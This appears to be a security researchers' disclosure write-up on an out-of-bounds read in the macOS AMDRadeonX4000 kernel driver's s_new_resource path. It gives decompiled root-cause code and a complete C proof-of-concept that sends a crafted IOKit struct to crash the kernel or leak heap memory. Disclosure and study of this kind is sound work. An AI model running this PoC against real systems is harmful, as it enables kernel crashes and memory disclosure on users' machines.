---
layout: default
author: junzhi lu, juwei lin
date: 2018-11-28 10:38:00 +0800
---

# Apple AMDRadeonX4000 s_new_resource Out-Of-Bound memory reading [INTERNAL]

## Overview

This vulnerability existsd in I/O Kit module AMDRadeonX4000.



## Root Cause Analysis

### 1. s_new_resource passes arguments without further check

```c
__int64 __cdecl IOAccelSharedUserClient2::s_new_resource(IOAccelSharedUserClient2 *this, void *a2, IOExternalMethodArguments *args)
{
  __int64 v3; // rax
  IOAccelNewResourceReturnData *retutnData; // r15
  IOMemoryDescriptor *discriptor; // rdi
  IOMemoryMap *maped; // r14
  void *structInput; // r12
  unsigned __int64 structInputSize; // rax
  unsigned int returnCode; // er13
  __int64 v14; // [rsp-8h] [rbp-30h]

  v14 = v3;
  retutnData = args->structureOutput;
  discriptor = args->structureInputDescriptor;
  if ( discriptor )
  {
    a2 = &loc_1000;
    maped = (discriptor->vtable->IOMemoryDescriptor::map)(discriptor, 4096LL);
    if ( !maped )
    {
      _os_log_internal(/*...omited...*/);
      return 0xE00002C8;
    }
    structInput = (maped->vtable->IOMemoryMap::getVirtualAddress)(maped);
    structInputSize = (args->structureInputDescriptor->vtable->IOMemoryDescriptor::getLength)(args->structureInputDescriptor);
  }
  else
  {
    structInputSize = args->structureInputSize;
    structInput = args->structureInput;
    maped = 0LL;
  }
  returnCode = 0xE00002C2;
  
  if ( retutnData && structInputSize >= 0x60 && structInput ) ------------ (1.a)
  {
    returnCode = IOAccelSharedUserClient2::new_resource(
                   this,
                   structInput,
                   retutnData,
                   structInputSize,
                   &args->structureOutputSize);
  }
  if ( maped )
    (maped->vtable->OSObject::release)(maped);
  if ( returnCode )
    _os_log_internal(/*...omited...*/);
  else
    returnCode = 0;
  return returnCode;
}
```

With some Reverse Engeneering, we can found that `structinput` was not checked strictly at `1.a` and then it was passed to `IOAccelSharedUserClient2::new_resource`



### 2. new_resource allocate and initialize new resource without further check

```c++
__int64 __fastcall IOAccelSharedUserClient2::new_resource(IOAccelSharedUserClient2 *this, IOAccelNewResourceArgs *args, IOAccelNewResourceReturnData *retutnData, unsigned __int64 argSize, unsigned int *outputSize)
{
  //in this omited code, it does different operations to allocate a new resource depending on the first 4 bytes of ***args*** like following
  //IOAccelResource2::newResourceWithXXXXXX(....)

  
  if ( !resource )									-------------------------------- (2.a)
    goto resourceShortageError;
    
  //@pc: 0x1e785
  if ( !(resource->vtable->IOAccelResource2::initialize)(resource, args, v5)) 
  {
    _os_log_internal(/* omited */);
  }
}
```

```c++
//class relactionship
IOAccelResource2::AMDRadeonX4000_AMDAccelResource
```



At `2.a`, once the resource has been allocated successfully, the `initalized` method was called. However, this virtual function was overrideed by `AMDRadeonX4000_AMDAccelResource:initialize` .



### 3. AMDRadeonX4000_AMDAccelResource::initialize copies memory according to a user-mode controlled value

```c++
void *__cdecl AMDRadeonX4000_AMDAccelResource::initialize(AMDRadeonX4000_AMDAccelResource *this, char *args, unsigned __int64 a3)
{ 
    
    
  /***....code omited...***/
  
  //@pc: 0xe5fe
  if ( *((_DWORD *)args + 62) ) // qword [args + 0xF8] 	=> entryCount
  {
    buff = (char *)IOMalloc(24LL * *((unsigned int *)args + 62));  ------------- (3.a)
    this->entryBuffer = (__int64)buff;
    if ( buff )
    {
      BYTE2(this->field_184) |= 8u;
      entryCount = *((unsigned int *)args + 62); // qword [args + 0xF8] 	=> entryCount
      this->entryCount = entryCount;
      if ( entryCount )
      {
        i = 0LL;
        do													--------------------- (3.b)
        {
          *(_QWORD *)&buff[i] = *(_QWORD *)&args[i + 152]; // page fault here
          *(_QWORD *)&buff[i + 8] = *(_QWORD *)&args[i + 160];
          *(_DWORD *)&buff[i + 16] = *(_DWORD *)&args[i + 168];
          i += 24LL;
          --entryCount;
        }
        while ( entryCount );
      }
    }
    else
    {
      this->entryCount = 0;
      v5 = 0;
    }
      
    /* code omited */
  }
```

At `3.a`, it allocated a buffer according to `entryCount` and then copy the data to newly allocated `entryBuffer` block by block as a size of `24` at `3.b`. However, it does not check the source memory length,  thus making an **Out-Of-Bound Read** vulnerability.





### PoC Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>

#include <libkern/OSAtomic.h>

#include <mach/thread_act.h>

#include <pthread.h>

#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sys/mman.h>

unsigned int selector = 0;

uint64_t inputScalar = 0;
size_t inputScalarCnt = 0;


uint8_t inputStruct[3760];
size_t inputStructCnt = 0;

uint64_t outputScalar = 0;
uint32_t outputScalarCnt = 0;

uint8_t outputStruct[72] = {0};
size_t outputStructCnt = 0;

io_connect_t global_conn = MACH_PORT_NULL;


void set_params(io_connect_t conn)
{

    

    uint64_t *qword = (uint64_t *)inputStruct;
    uint32_t *dword = (uint32_t *)inputStruct;

    //capture this data via a kernel debug breakpoint, make newResourceXXX work
    qword[1] = 0x0000000100400040;
    qword[3] = 0x0000000000000100;
    qword[4] = 0x0000243004000101;
    qword[10] = 0x0000000000004000;
    qword[12] = 0x0000010000000000;
    qword[13] = 0x0000010000000000;
    qword[14] = 0x0040004000400040;
    qword[15] = 0x000300c000040001;
    qword[16] = 0x00007f8689415870;

    //copy data from input+0x98 to buffer according to this value
    dword[62] = 0x100000; 
    // 0x100000 entries with 8x size, big enough to make a page fault

    global_conn = conn;
    selector = 0;
    inputScalarCnt = 0;
    inputStructCnt = 3760;
    outputScalarCnt = 0;
    outputStructCnt = 72;
}

kern_return_t make_iokit_call()
{
    kern_return_t ret = IOConnectCallMethod(
        global_conn,
        selector,
        inputScalar,
        inputScalarCnt,
        inputStruct,
        inputStructCnt,
        outputScalar,
        &outputScalarCnt,
        outputStruct,
        &outputStructCnt);

    return ret;
}

mach_port_t get_user_client(char *name, int type)
{
    kern_return_t err;

    CFMutableDictionaryRef matching = IOServiceMatching(name);
    if (!matching)
    {
        printf("unable to create service matching dictionary\n");
        return 0;
    }

    io_iterator_t iterator;
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
    if (err != KERN_SUCCESS)
    {
        printf("no matches\n");
        return 0;
    }

    io_service_t service = IOIteratorNext(iterator);

    if (service == IO_OBJECT_NULL)
    {
        printf("unable to find service\n");
        return 0;
    }
    printf("got service: %x\n", service);

    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(), type, &conn);
    if (err != KERN_SUCCESS)
    {
        printf("unable to get user client connection\n");
        return 0;
    }

    printf("got userclient connection: %x\n", conn);

    return conn;
}


/*
    AMDRadeon X4000 s_new_resource OOB read
    usage : clang poc.c -framework IOKit -o poc && ./poc
*/
int main(int argc, char **argv)
{
    kern_return_t err;

    io_connect_t conn = get_user_client("AMDRadeonX4000_AMDGraphicsAccelerator", 6);
    set_params(conn);
    kern_return_t ret = make_iokit_call();

    printf("IOReturn : %#x\n", ret);

    return 0;
}
```





## Q & A

### How did you find this vulnerability?

by fuzzing.



### Can you identify exploitability?

This is a **Out-of-Bound read** vulnerability. It can crash the kernel or leak kernel heap memory. Attacker may craft a struct and use this vulnerability to copy more data from input heap to the newly created buffer than expected. When the newly created buffer contains



### Can you identify root cause?

Yes, see the root cause analysis.



### Vulnerable software and hardware

macOS 10.14.1 and all before  with an **AMDRadeon X4000 Series Graphics Card Driver**



  [Back Home]({{site.url}}{{site.baseurl}})